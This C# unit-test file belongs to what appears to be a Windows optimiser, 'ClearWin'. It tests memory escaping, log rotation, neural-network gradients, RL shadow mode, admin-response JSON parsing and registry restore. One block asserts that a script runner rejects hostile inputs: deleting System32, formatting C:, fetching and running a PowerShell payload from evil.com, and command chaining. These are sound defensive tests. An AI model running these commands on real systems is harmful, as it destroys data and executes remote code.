                var memReloaded = new AiPersistentMemory(tempMemPath);
                Assert(memReloaded.Load(), "SEC-10: Memory file loaded successfully");
                Assert(memReloaded.TotalCount == 1, "SEC-10: Record parsed correctly without delimiter breakage");
                var records = memReloaded.GetRecent(1);
                Assert(records.Length == 1, "SEC-10: Exactly one record retrieved");
                Assert(records[0].Kind == "Test|Kind", "SEC-10: Kind unescaped correctly");
                Assert(records[0].Action == "Action|With|Pipe", "SEC-10: Action unescaped correctly");
                Assert(records[0].Detail == "Detail|With|Pipes", "SEC-10: Detail unescaped correctly");
            }
            finally
            {
                try { if (File.Exists(tempMemPath)) File.Delete(tempMemPath); } catch { }
            }

            // 10. SEC-06: SmartAgent.ToolTraining.RunCustomScript input sanitation
            var testAgent = new SmartAgent();
            Assert(!testAgent.RunCustomScript("cmd:del /f /q C:\\Windows\\System32"), "SEC-06: Destructive del command blocked");
            Assert(!testAgent.RunCustomScript("cmd:format C: /y"), "SEC-06: Destructive format command blocked");
            Assert(!testAgent.RunCustomScript("powershell:iex (irm http://evil.com/payload.ps1)"), "SEC-06: iex download execution blocked");
            Assert(!testAgent.RunCustomScript("cmd:echo 1 & calc.exe"), "SEC-06: Command chaining with & blocked");
            Assert(!testAgent.RunCustomScript("cmd:echo 1 | calc.exe"), "SEC-06: Command piping with | blocked");
            Assert(!testAgent.RunCustomScript("cmd:echo 1 ; calc.exe"), "SEC-06: Command chaining with ; blocked");
            Assert(!testAgent.RunCustomScript("bash:echo test"), "SEC-06: Unregistered prefix blocked");

            // 11. SEC-11: ClearWinAuditLogger 5MB log rotation
            string tempAuditPath = Path.Combine(Path.GetTempPath(), "clearwin_sec11_audit_" + Guid.NewGuid().ToString("N") + ".jsonl");
            try
            {
                // Write a file slightly exceeding 5MB (5 * 1024 * 1024 + 128 bytes)
                byte[] dummyData = new byte[5 * 1024 * 1024 + 128];
                File.WriteAllBytes(tempAuditPath, dummyData);
                Assert(File.Exists(tempAuditPath), "Temporary 5MB audit log created");
                ClearWinAuditLogger.RotateIfNeeded(tempAuditPath);
                Assert(!File.Exists(tempAuditPath), "Original log rotated out");
                Assert(File.Exists(tempAuditPath + ".bak"), "Rotated .bak backup created");
            }
            finally
            {
                try { if (File.Exists(tempAuditPath)) File.Delete(tempAuditPath); } catch { }
                try { if (File.Exists(tempAuditPath + ".bak")) File.Delete(tempAuditPath + ".bak"); } catch { }
            }

            // 12. SmartAgent.FramePacing struct and P/Invoke integrity
            long idleMs = testAgent.GetSystemIdleMs();
            Assert(idleMs >= 0, "SmartAgent.FramePacing.GetSystemIdleMs succeeds using canonical LASTINPUTINFO / GetLastInputInfo from SmartAgent.cs");
        }

        public static void TestV277IndependentVerificationSuitePublic()
        {
            // 1. MLNeuralNetwork: Eval determinism vs Train stochastic dropout
            var net = new MLNeuralNetwork(123);
            double[] xPos = new double[] { 1.5, 1.8, -0.5, -0.3, 1.2, 0.5, -1.0, -1.0, -1.0, 0.8, 0.0, 0.0, -1.0, -1.0, 1.0, 0.8, 1.1, 0.4 };
            double[] xNeg = new double[] { -1.2, -1.5, -0.8, -0.9, -1.0, -0.8, 1.0, 1.0, 1.0, -0.8, 0.0, 0.0, -1.0, -1.0, 1.0, -0.2, -0.3, -0.1 };

            double pInitPos = net.Forward(xPos);
            for (int step = 0; step < 25; step++)
            {
                net.Train(xPos, 1.0, 0.12);
                net.Train(xNeg, 0.0, 0.12);
            }
            double pFinalPos = net.Forward(xPos);
            double pFinalNeg = net.Forward(xNeg);
            Assert(pFinalPos > pInitPos && pFinalPos > 0.85, "MLNeuralNetwork positive sample converged (>0.85): " + pFinalPos);
            Assert(pFinalNeg < 0.15, "MLNeuralNetwork negative sample suppressed (<0.15): " + pFinalNeg);

            // Verify Eval mode is strictly deterministic (zero variance across repeated Forward calls)
            double eval1 = net.Forward(xPos);
            double eval2 = net.Forward(xPos);
            Assert(Math.Abs(eval1 - eval2) < 1e-12, "Forward (eval mode) must be deterministic without dropout randomness");

            // 2. RunningNormalizer: NaN and Infinity rejection without poisoning running statistics
            var norm = new RunningNormalizer();
            string reason;
            double[] nanVec = new double[18];
            nanVec[0] = double.NaN;
            Assert(norm.IsAnomaly(nanVec, out reason), "RunningNormalizer.IsAnomaly must reject NaN input");
            double[] infVec = new double[18];
            infVec[1] = double.PositiveInfinity;
            Assert(norm.IsAnomaly(infVec, out reason), "RunningNormalizer.IsAnomaly must reject Infinity input");

            // 3. Disjoint Train/Test Generalization Check (Zero Data Leakage)
            var ens = new MLEnsemble("AggressiveClean");
            var rngTrain = new Random(2026);
            var rngTest = new Random(99999);
            for (int ep = 0; ep < 8; ep++)
            {
                for (int i = 0; i < 20; i++)
                {
                    double[] trPos = new double[] { 0.5, 1.6 + rngTrain.NextDouble() * 0.4, -0.3, 0.0, 0.2, 0.1, -1.0, -1.0, 1.0, 0.5, 0, 0, -1.0, -1.0, 1.0, 0.2, 0.5, 0.1 };
                    double[] trNeg = new double[] { -0.5, -1.2 - rngTrain.NextDouble() * 0.4, -0.5, 0.0, -0.5, -0.5, 1.0, 1.0, 1.0, -0.5, 0, 0, 1.0, -1.0, 1.0, 0.0, -0.2, 0.0 };
                    ens.Train(trPos, 1.0, 0.08);
                    ens.Train(trNeg, 0.0, 0.08);
                }
            }
            int testCorrect = 0;
            for (int i = 0; i < 20; i++)
            {
                double[] tePos = new double[] { 0.4, 1.5 + rngTest.NextDouble() * 0.5, -0.2, 0.0, 0.3, 0.1, -1.0, -1.0, 1.0, 0.4, 0, 0, -1.0, -1.0, 1.0, 0.1, 0.4, 0.1 };
                double[] teNeg = new double[] { -0.4, -1.1 - rngTest.NextDouble() * 0.5, -0.4, 0.0, -0.4, -0.4, 1.0, 1.0, 1.0, -0.4, 0, 0, 1.0, -1.0, 1.0, 0.0, -0.1, 0.0 };
                if (ens.Predict(tePos) >= 0.5) testCorrect++;
                if (ens.Predict(teNeg) < 0.5) testCorrect++;
            }
            Assert(testCorrect >= 36, "MLEnsemble generalizes to disjoint test set (>=90% accuracy): " + testCorrect + "/40");

            // 4. Central Finite-Difference Numerical vs Analytical Gradient Check on Production C# MLNeuralNetwork
            var fdNet = new MLNeuralNetwork(77);
            double[] fdInput = new double[] { 0.7, -1.1, 0.4, 1.3, -0.6, 0.2, -0.5, 0.8, -0.3, 1.1, -0.4, 0.6, -0.9, 0.3, 0.5, -0.7, 0.9, -0.2 };
            double fdTarget = 1.0;
            double[] gW1, gB1, gW2, gB2, gW3, gBN1G, gBN1B, gBN2G, gBN2B;
            double gB3;
            fdNet.ComputeAnalyticalGradients(fdInput, fdTarget, out gW1, out gB1, out gW2, out gB2, out gW3, out gB3, out gBN1G, out gBN1B, out gBN2G, out gBN2B);

            double eps = 1e-6;
            // Full parameter-group finite-difference gradient verification: W3, B3, BN2G, BN2B, W2, BN1G, BN1B, W1
            {
                double origB3 = fdNet.B3;
                fdNet.B3 = origB3 + eps; double oP3 = fdNet.Forward(fdInput); double lP3 = 0.5 * (oP3 - fdTarget) * (oP3 - fdTarget);
                fdNet.B3 = origB3 - eps; double oM3 = fdNet.Forward(fdInput); double lM3 = 0.5 * (oM3 - fdTarget) * (oM3 - fdTarget);
                fdNet.B3 = origB3;
                double numB3 = (lP3 - lM3) / (2.0 * eps);
                Assert(Math.Abs(gB3 - numB3) < 1e-7, "Finite-difference gradient check B3 failed");
            }
            for (int i = 0; i < 16; i++)
            {
                double origW3 = fdNet.W3[i];
                fdNet.W3[i] = origW3 + eps; double oP = fdNet.Forward(fdInput); double lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.W3[i] = origW3 - eps; double oM = fdNet.Forward(fdInput); double lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.W3[i] = origW3;
                double numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gW3[i] - numG) < 1e-7, "Finite-difference gradient check W3[" + i + "] failed");

                double origG2 = fdNet.BN2G[i];
                fdNet.BN2G[i] = origG2 + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.BN2G[i] = origG2 - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.BN2G[i] = origG2;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gBN2G[i] - numG) < 1e-7, "Finite-difference gradient check BN2G[" + i + "] failed");

                double origB2Beta = fdNet.BN2B[i];
                fdNet.BN2B[i] = origB2Beta + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.BN2B[i] = origB2Beta - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.BN2B[i] = origB2Beta;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gBN2B[i] - numG) < 1e-7, "Finite-difference gradient check BN2B[" + i + "] failed");

                double origW2 = fdNet.W2[i];
                fdNet.W2[i] = origW2 + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.W2[i] = origW2 - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.W2[i] = origW2;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gW2[i] - numG) < 1e-7, "Finite-difference gradient check W2[" + i + "] failed");

                double origG1 = fdNet.BN1G[i];
                fdNet.BN1G[i] = origG1 + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.BN1G[i] = origG1 - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.BN1G[i] = origG1;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gBN1G[i] - numG) < 1e-7, "Finite-difference gradient check BN1G[" + i + "] failed");

                double origB1Beta = fdNet.BN1B[i];
                fdNet.BN1B[i] = origB1Beta + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.BN1B[i] = origB1Beta - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.BN1B[i] = origB1Beta;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gBN1B[i] - numG) < 1e-7, "Finite-difference gradient check BN1B[" + i + "] failed");

                double origW1 = fdNet.W1[i];
                fdNet.W1[i] = origW1 + eps; oP = fdNet.Forward(fdInput); lP = 0.5 * (oP - fdTarget) * (oP - fdTarget);
                fdNet.W1[i] = origW1 - eps; oM = fdNet.Forward(fdInput); lM = 0.5 * (oM - fdTarget) * (oM - fdTarget);
                fdNet.W1[i] = origW1;
                numG = (lP - lM) / (2.0 * eps);
                Assert(Math.Abs(gW1[i] - numG) < 1e-7, "Finite-difference gradient check W1[" + i + "] failed");
            }

            // 5. RL2Engine: State capacity cap at RL2_MAX_STATES (400), visit-seeded retention, and Shadow Mode default isolation
            var agent = new SmartAgent();
            var simState = new SystemState { CpuUsage = 30, RamUsage = 85, CpuTemp = 50, GpuUsage = 20, DiskUsage = 20, IsGame = false, ProcessCount = 140 };
            agent.EnableSimulation(simState);
            try
            {
                Assert(!agent.EnableRL2LiveInfluence, "RL2 live influence must default to false (Shadow Mode)");
                var decBeforeRL = agent.GetOptimizationDecisionForState(simState);
                for (int w = 0; w < 8; w++)
                {
                    agent.RecordRLExperience("S_WARM_STATE", "AggressiveClean", 0.9, "S_IDLE_STATE");
                }
                agent.RecordRLExperience("S_COLD_ONCE", "LightClean", 0.1, "S_IDLE_STATE");
                for (int idx = 0; idx < 450; idx++)
                {
                    agent.RecordRLExperience("S_FILL_" + idx, "NONE", 0.05, "S_IDLE_STATE");
                }
                Assert(agent.GetStateAwareStateCount() <= 400, "RL2 state count strictly bounded at RL2_MAX_STATES=400 (got " + agent.GetStateAwareStateCount() + ")");
                Assert(agent.SelectBestStateAction("S_WARM_STATE") == "AggressiveClean", "Warm state retained and selects AggressiveClean");

                // Verify that seeding a GPU action in RL2 is selectable (20-action ML_AC coverage)
                string liveStateKey = agent.BuildStateKey(agent.GetCurrentRLState());
                agent.SeedStateQValue(liveStateKey, "OptimizeGpuPerformance", 0.94);
                Assert(agent.SelectBestStateAction(liveStateKey) == "OptimizeGpuPerformance", "RL2 table selects GPU action from full 20-action ML_AC space");
                Assert(agent.GetStateActionVisits(liveStateKey, "OptimizeGpuPerformance") >= 1, "SeedStateQValue initializes visit count >= 1");

                var decAfterRL = agent.GetOptimizationDecisionForState(simState);
                Assert(decBeforeRL != null && decAfterRL != null && decBeforeRL.Action == decAfterRL.Action,
                    "Shadow Mode default (EnableRL2LiveInfluence=false) does not alter live decision choice");
            }
            finally
            {
                agent.DisableSimulation();
            }
        }

        public static void TestV277Phase1PrivilegesAndJsonParserPublic()
        {
            // 1. Valid AdminHelper success response
            string validSuccess = "{\"requestId\":\"req_101\",\"success\":true,\"exitCode\":0,\"status\":\"RESTORE_POINT_CREATED\",\"message\":\"Verified\",\"output\":\"OK\",\"error\":\"\",\"durationMs\":450}";
            var rOk = AdminSessionManager.ParseHelperResponse(validSuccess, "req_101");
            Assert(rOk.Success && rOk.ExitCode == 0 && rOk.Status == "RESTORE_POINT_CREATED" && rOk.DurationMs == 450,
                "Valid AdminHelper response parsed accurately");

            // 2. Non-zero exitCode overrides success:true -> fail-closed
            string contradictory = "{\"requestId\":\"req_102\",\"success\":true,\"exitCode\":1,\"status\":\"SUCCESS\",\"message\":\"Fake\"}";
            var rContradict = AdminSessionManager.ParseHelperResponse(contradictory, "req_102");
            Assert(!rContradict.Success && rContradict.ExitCode == 1,
                "Non-zero exitCode forces Success=false even if JSON claims success:true");

            // 3. String-escaped JSON spoofing inside output field
            string stringSpoof = "{\"requestId\":\"req_103\",\"output\":\"{\\\"success\\\":true,\\\"exitCode\\\":0,\\\"status\\\":\\\"SUCCESS\\\"}\",\"success\":false,\"exitCode\":1,\"status\":\"RESTORE_POINT_EXIT_1\"}";
            var rStrSpoof = AdminSessionManager.ParseHelperResponse(stringSpoof, "req_103");
            Assert(!rStrSpoof.Success && rStrSpoof.ExitCode == 1 && rStrSpoof.Status == "RESTORE_POINT_EXIT_1",
                "String-escaped JSON inside output field cannot spoof top-level success/exitCode");

            // 4. Unescaped nested JSON object spoofing (depth > 1)
            string nestedObjSpoof = "{\"requestId\":\"req_104\",\"output\":{\"success\":true,\"exitCode\":0,\"status\":\"SUCCESS\"},\"success\":false,\"exitCode\":2,\"status\":\"EXECUTION_FAILED\"}";
            var rNestedObj = AdminSessionManager.ParseHelperResponse(nestedObjSpoof, "req_104");
            Assert(!rNestedObj.Success && rNestedObj.ExitCode == 2 && rNestedObj.Status == "EXECUTION_FAILED",
                "Unescaped nested object {\"success\":true} at depth > 1 must be ignored by top-level parser");

            // 5. Unescaped nested JSON array spoofing (bracketDepth > 0)
            string nestedArrSpoof = "{\"requestId\":\"req_105\",\"output\":[{\"success\":true,\"exitCode\":0,\"status\":\"SUCCESS\"}],\"success\":false,\"exitCode\":5,\"status\":\"ACCESS_DENIED\"}";
            var rNestedArr = AdminSessionManager.ParseHelperResponse(nestedArrSpoof, "req_105");
            Assert(!rNestedArr.Success && rNestedArr.ExitCode == 5 && rNestedArr.Status == "ACCESS_DENIED",
                "Unescaped nested array [{\"success\":true}] must be ignored by top-level parser");

            // 6. Duplicate top-level key attack -> rejected fail-closed as INVALID_RESPONSE
            string duplicateKeyJson = "{\"requestId\":\"req_106\",\"success\":false,\"status\":\"FAILED\",\"success\":true}";
            var rDup = AdminSessionManager.ParseHelperResponse(duplicateKeyJson, "req_106");
            Assert(!rDup.Success && rDup.Status == "INVALID_RESPONSE" && rDup.Error.Contains("Duplicate top-level JSON key"),
                "Duplicate top-level JSON key must be rejected fail-closed");

            // 7. Mismatched requestId, malformed JSON, and empty response
            var rMismatch = AdminSessionManager.ParseHelperResponse(validSuccess, "req_wrong");
            Assert(!rMismatch.Success && rMismatch.Status == "REQUEST_ID_MISMATCH", "Mismatched requestId rejected");

            var rMalformed = AdminSessionManager.ParseHelperResponse("{\"requestId\":\"req_107\",\"success\":true", "req_107");
            Assert(!rMalformed.Success && rMalformed.Status == "INVALID_RESPONSE", "Truncated/unclosed JSON rejected");

            var rEmpty = AdminSessionManager.ParseHelperResponse("", "req_108");
            Assert(!rEmpty.Success && rEmpty.Status == "EMPTY_RESPONSE", "Empty JSON rejected");

            // 8. Single-flight guards for Restore Point & DNS Flush + network.repair-preview vs network.flush-dns
            Assert(MainWindow.TryEnterRestorePointFlight(), "First RestorePoint flight enters");
            Assert(!MainWindow.TryEnterRestorePointFlight(), "Concurrent duplicate RestorePoint flight blocked");
            MainWindow.ExitRestorePointFlight();
            Assert(MainWindow.TryEnterRestorePointFlight(), "RestorePoint flight re-enters after exit");
            MainWindow.ExitRestorePointFlight();

            Assert(MainWindow.TryEnterDnsFlushFlight(), "First DnsFlush flight enters");
            Assert(!MainWindow.TryEnterDnsFlushFlight(), "Concurrent duplicate DnsFlush flight blocked");
            MainWindow.ExitDnsFlushFlight();

            Assert(WebUiHost.IsActionAllowed("network.repair-preview"), "network.repair-preview allowed");
            Assert(WebUiHost.IsActionAllowed("network.flush-dns"), "network.flush-dns allowed");
            Assert(!ActionCatalog.IsRegistered("risky-network"), "risky-network is not a valid catalog action");
        }

        public static void TestV277Phase2RegistryAndPowerStatePublic()
        {
            string tempJournal = Path.Combine(Path.GetTempPath(), "clearwin_test_reg_journal_" + Guid.NewGuid().ToString("N") + ".ini");
            try
            {
                SmartAgent.ResetRegistryBackupStateForTests(tempJournal, useSimulatedBackend: true);

                // 1. Key/Value did NOT exist before (e.g. MaxPreRenderedFrames) -> created -> deleted on restore
                const string d3dKey = @"Software\Microsoft\Direct3D";
                string d3dComp = @"HKCU\" + d3dKey + "::MaxPreRenderedFrames";
                Assert(!SmartAgent.SimulatedRegistryValues.ContainsKey(d3dComp), "MaxPreRenderedFrames absent initially");
                bool w1 = SmartAgent.SetRegistryValueWithBackup("HKCU", d3dKey, "MaxPreRenderedFrames", 1, Microsoft.Win32.RegistryValueKind.DWord, true);
                Assert(w1 && SmartAgent.SimulatedRegistryValues[d3dComp].Item2 == "1", "MaxPreRenderedFrames written as 1");
                Assert(File.Exists(tempJournal), "Durable registry restore journal written to disk");

                // 2. Key/Value existed before (e.g. GameLoop PerformanceMode = 0) -> updated to 2 -> restored to 0
                const string glKey = @"Software\Tencent\GameLoop\Settings\Common";
                string glSubComp = @"HKCU\" + glKey;
                string glPerfComp = glSubComp + "::PerformanceMode";
                string glVsyncComp = glSubComp + "::Vsync";
                SmartAgent.SimulatedRegistrySubKeys.Add(glSubComp);
                SmartAgent.SimulatedRegistryValues[glPerfComp] = Tuple.Create(Microsoft.Win32.RegistryValueKind.DWord, "0");
                SmartAgent.SimulatedRegistryValues[glVsyncComp] = Tuple.Create(Microsoft.Win32.RegistryValueKind.DWord, "1");

                SmartAgent.SetRegistryValueWithBackup("HKCU", glKey, "PerformanceMode", 2, Microsoft.Win32.RegistryValueKind.DWord, false);
                SmartAgent.SetRegistryValueWithBackup("HKCU", glKey, "Vsync", 0, Microsoft.Win32.RegistryValueKind.DWord, false);
                Assert(SmartAgent.SimulatedRegistryValues[glPerfComp].Item2 == "2", "PerformanceMode updated to 2");
                Assert(SmartAgent.SimulatedRegistryValues[glVsyncComp].Item2 == "0", "Vsync updated to 0");

                // 3. User manually overrides Vsync to 3 while ClearWin is running -> Restore must NOT overwrite user's choice!
                SmartAgent.SimulatedRegistryValues[glVsyncComp] = Tuple.Create(Microsoft.Win32.RegistryValueKind.DWord, "3");

                bool restored = SmartAgent.RestoreAllBackedUpRegistrySettings();
                Assert(restored, "RestoreAllBackedUpRegistrySettings succeeded");
                Assert(!SmartAgent.SimulatedRegistryValues.ContainsKey(d3dComp), "Newly created MaxPreRenderedFrames was deleted on restore");
                Assert(SmartAgent.SimulatedRegistryValues[glPerfComp].Item2 == "0", "Pre-existing PerformanceMode restored to original 0");
                Assert(SmartAgent.SimulatedRegistryValues[glVsyncComp].Item2 == "3", "User manual change to Vsync (3) preserved and NOT overwritten!");
                Assert(!File.Exists(tempJournal), "Journal file cleaned up when all entries are restored");

                // 4. PowerPlan satisfaction check: prevents 30s oscillation when Ultimate resolves to High Performance
                Assert(SmartAgent.IsPowerPlanSatisfied("high", "ultimate", hasTrueUltimatePlan: false),
                    "High performance plan satisfies ultimate recommendation when no dedicated Ultimate plan exists");
                Assert(!SmartAgent.IsPowerPlanSatisfied("high", "ultimate", hasTrueUltimatePlan: true),
                    "High performance plan does not satisfy ultimate when dedicated Ultimate plan exists");
                Assert(SmartAgent.IsPowerPlanSatisfied("balanced", "balanced", hasTrueUltimatePlan: false),
                    "Balanced satisfies balanced");
            }
            finally
            {
                SmartAgent.ResetRegistryBackupStateForTests(null, useSimulatedBackend: false);
                try { if (File.Exists(tempJournal)) File.Delete(tempJournal); } catch { }
            }
        }

        public static void TestV277Phase3And5MLAndRL2FixesPublic()
        {
            // 1. RunningNormalizer: NormalizeReadOnly must NEVER mutate _c, _m, or _s
            var norm = new RunningNormalizer();
            double[] sample = new double[] { 65, 75, 50, 30, 68, 60, 58, 45, 85, 130, 15, 20, 1, 0, 100, 2, 3, 1 };
            norm.Observe(sample);
            int[] countsAfterObserve = norm.GetCounts();
            double[] meansAfterObserve = norm.GetMeans();
            Assert(countsAfterObserve[0] == 1, "Observe increments count to 1");

            for (int k = 0; k < 200; k++)
            {
                norm.NormalizeReadOnly(new double[] { 90, 90, 90, 90, 90, 90, 20, 10, 40, 250, 22, 50, 1, 0, 50, 5, 5, 5 });
            }
            int[] countsAfterReadOnly = norm.GetCounts();
            double[] meansAfterReadOnly = norm.GetMeans();
            Assert(countsAfterReadOnly[0] == 1 && Math.Abs(meansAfterReadOnly[0] - meansAfterObserve[0]) < 1e-12,
                "NormalizeReadOnly must leave running counts and means 100% unchanged");

            // 2. Pre-LayerNorm bias B1/B2 invariance & zero gradient in Train()
            var net = new MLNeuralNetwork(2026);
            double[] x = new double[] { 0.5, -0.4, 0.8, -0.2, 0.3, -0.6, 0.1, 0.9, -0.7, 0.2, -0.3, 0.4, 1.0, -1.0, 0.5, 0.1, -0.1, 0.2 };
            double outBeforeShift = net.Forward(x);
            for (int h = 0; h < net.B1.Length; h++) net.B1[h] += 3.5; // uniform shift to B1
            double outAfterShift = net.Forward(x);
            Assert(Math.Abs(outBeforeShift - outAfterShift) < 1e-11, "LayerNorm is invariant to uniform pre-norm bias shift");

            // 3. V4 Save/Load round-trip of LayerNorm AdamW moments (MBN1G..VBN2B)
            var agent1 = new SmartAgent();
            var sPos = new SystemState { CpuUsage = 35, RamUsage = 88, CpuTemp = 55, IsGame = false };
            var sNeg = new SystemState { CpuUsage = 20, RamUsage = 35, CpuTemp = 45, IsGame = true };
            agent1.TeachActionWeight("AggressiveClean", sPos, 0.95, epochs: 10, lr: 0.10);
            agent1.TeachActionWeight("AggressiveClean", sNeg, 0.05, epochs: 10, lr: 0.10);
            agent1.SaveModelData();

            var agent2 = new SmartAgent();
            agent2.LoadModelData();
            double p1 = agent1.EvaluateActionWeight("AggressiveClean", sPos);
            double p2 = agent2.EvaluateActionWeight("AggressiveClean", sPos);
            Assert(Math.Abs(p1 - p2) < 1e-6, "V4 model save/load round-trip preserves exact ensemble predictions");

            // 4. RL2Engine Symmetric Double-Q + Shadow Mode vs Gated Live Influence
            agent1.EnableSimulation(sPos);
            try
            {
                string stKey = "TEST_DOUBLE_Q_STATE";
                agent1.RecordRLExperience(stKey, "OptimizeGpuPerformance", 0.92, "TEST_NEXT_STATE");
                agent1.RecordRLExperience(stKey, "OptimizeGpuPerformance", 0.90, "TEST_NEXT_STATE");
                agent1.RecordRLExperience(stKey, "OptimizeGpuPerformance", 0.94, "TEST_NEXT_STATE");
                Assert(agent1.GetStateActionVisits(stKey, "OptimizeGpuPerformance") >= 3, "RL2 recorded 3 visits");
                Assert(agent1.GetCombinedStateQValue(stKey, "OptimizeGpuPerformance") > 0.55, "Symmetric Double-Q elevated combined Q value");

                long compBefore = agent1.RL2ShadowComparisons;
                var testDecisions = new List<AgentDecision>
                {
                    new AgentDecision { Action = "AggressiveClean", Category = DecisionCategory.MemoryClean, Confidence = 0.80, Safety = DecisionSafety.Safe }
                };
                agent1.EnableRL2LiveInfluence = false;
                agent1.EvaluateRL2ShadowAndOptionalInfluence(testDecisions);
                Assert(agent1.RL2ShadowComparisons == compBefore + 1, "Shadow Mode increments RL2ShadowComparisons");
                Assert(Math.Abs(testDecisions[0].Confidence - 0.80) < 1e-12, "Shadow Mode does not mutate live decision confidence");
            }
            finally
            {
                agent1.DisableSimulation();
            }
        }
    }

    public sealed class MockAnalyzer : IAnalyzer
    {
        public string Name { get { return "Mock"; } }
        public bool CanRun(SystemSnapshot snapshot) { return snapshot.CpuUsage > 90; }
        public AnalysisResult Analyze(SystemSnapshot snapshot)
        {
            return new AnalysisResult { Action = "MockAction", Priority = 5, Confidence = 0.9, Category = DecisionCategory.ThermalProtect, Reason = "Test", Safety = DecisionSafety.Safe };
        }
    }
}
